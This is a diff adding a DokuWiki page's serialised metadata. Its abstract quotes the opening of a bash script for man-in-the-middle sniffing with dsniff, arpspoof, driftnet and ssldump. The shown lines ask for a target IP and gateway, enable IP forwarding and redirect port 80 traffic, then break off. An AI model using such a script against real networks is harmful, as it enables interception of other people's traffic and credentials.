@@ -1,0 +1,17 @@
+a:2:{s:7:"current";a:8:{s:4:"date";a:2:{s:7:"created";i:1471446494;s:8:"modified";i:1471446580;}s:7:"creator";s:10:"JonnyBravo";s:4:"user";s:10:"jonnybravo";s:11:"last_change";a:8:{s:4:"date";i:1471446580;s:2:"ip";s:14:"176.52.200.252";s:4:"type";s:1:"E";s:2:"id";s:6:"dsniff";s:4:"user";s:10:"jonnybravo";s:3:"sum";s:0:"";s:5:"extra";s:0:"";s:10:"sizechange";i:655;}s:11:"contributor";a:1:{s:10:"jonnybravo";s:10:"JonnyBravo";}s:8:"internal";a:2:{s:5:"cache";b:1;s:3:"toc";b:1;}s:11:"description";a:1:{s:8:"abstract";s:503:"kleines Bashskript zum starten von sniffing mit dsniff. 
+
+
+
+#!/bin/bash
+#this Skript use dsniff,arpspoff, driftnet, ssldump
+
+terminal="gnome-terminal -e "
+read -p "What is your current interface: " int
+read -p "What is your target computer ip addresse: " yip
+read -p "What is your target gateway ip addresse: " gip
+
+#Allow IP Forwarding 
+echo 1 > /proc/sys/net/ipv4/ip_forward
+#Port 80 Redirect to Port 10000
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+#St…";}s:8:"relation";a:1:{s:10:"firstimage";s:0:"";}}s:10:"persistent";a:5:{s:4:"date";a:2:{s:7:"created";i:1471446494;s:8:"modified";i:1471446580;}s:7:"creator";s:10:"JonnyBravo";s:4:"user";s:10:"jonnybravo";s:11:"last_change";a:8:{s:4:"date";i:1471446580;s:2:"ip";s:14:"176.52.200.252";s:4:"type";s:1:"E";s:2:"id";s:6:"dsniff";s:4:"user";s:10:"jonnybravo";s:3:"sum";s:0:"";s:5:"extra";s:0:"";s:10:"sizechange";i:655;}s:11:"contributor";a:1:{s:10:"jonnybravo";s:10:"JonnyBravo";}}}
